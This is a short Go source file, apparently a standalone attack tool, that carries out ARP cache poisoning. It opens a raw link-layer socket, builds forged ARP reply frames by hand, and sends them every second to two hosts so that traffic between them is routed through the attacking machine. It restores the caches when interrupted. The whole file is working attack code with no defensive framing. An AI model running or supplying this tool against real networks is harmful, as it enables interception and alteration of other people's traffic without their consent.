package arpPoison

import (
	"log"
	"net"
	"syscall"
	"time"
	"os/signal"
	"os"
	"fmt"
)

func Poison (args [][]byte, inter *net.Interface) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)	
	if err != nil {
		log.Fatal(err)
	}
	addr := syscall.SockaddrLinklayer {
		Ifindex: inter.Index,
	}
	chanSig := make(chan os.Signal, 1)
	signal.Notify(chanSig, syscall.SIGINT)
	for {
		select {
		case <-chanSig:
			sendPacket(fd, pkt_maker(args[4], args[5], args[1], args[2], args[3]), &addr)
			sendPacket(fd, pkt_maker(args[2], args[3], args[1], args[4], args[5]), &addr)
			os.Exit(0)
		default:
			sendPacket(fd, pkt_maker(args[4], args[1], args[1], args[2], args[3]), &addr)
			sendPacket(fd, pkt_maker(args[2], args[1], args[1], args[4], args[5]), &addr)
			time.Sleep(time.Second)
		}
	}
}

func sendPacket(fd int, packet []byte, address *syscall.SockaddrLinklayer) {
	err := syscall.Sendto(fd, packet, 0, address)
	if err != nil {
		fmt.Println(err)
	}
}

func pkt_maker(toFoolIp, toFoolMac, sourceMac, targetIp, targetMac []byte) []byte {
	base_pack := []byte {
		0x08, //type (arp)
		0x06,
		0x00, //ethernet
		0x01,
		0x08, //IP type
		0x00,
		0x06, //mac len
		0x04, //IP len
		0x00, //operation(response)
		0x02,
	}
	pack := make([]byte, 0, 42)
	pack = append(pack, targetMac...)
	pack = append(pack, sourceMac...)
	pack = append(pack, base_pack...)
	pack = append(pack, toFoolMac...)
	pack = append(pack, toFoolIp...)
	pack = append(pack, targetMac...)
	pack = append(pack, targetIp...)
	return pack
}
